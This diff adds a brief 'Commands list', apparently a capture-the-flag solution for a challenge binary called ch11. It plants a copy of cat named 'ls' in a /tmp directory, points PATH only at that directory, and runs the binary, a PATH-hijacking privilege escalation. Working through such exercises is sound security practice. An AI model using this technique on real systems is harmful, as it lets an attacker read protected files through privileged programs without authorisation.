@@ -1,0 +1,8 @@
+Commands list
+-------------
+
+mkdir /tmp/wr47h
+cp /bin/cat /tmp/wr47h
+mv /tmp/wr47h/cat /tmp/wr47h/ls
+PATH="/tmp/wr47h"
+./ch11
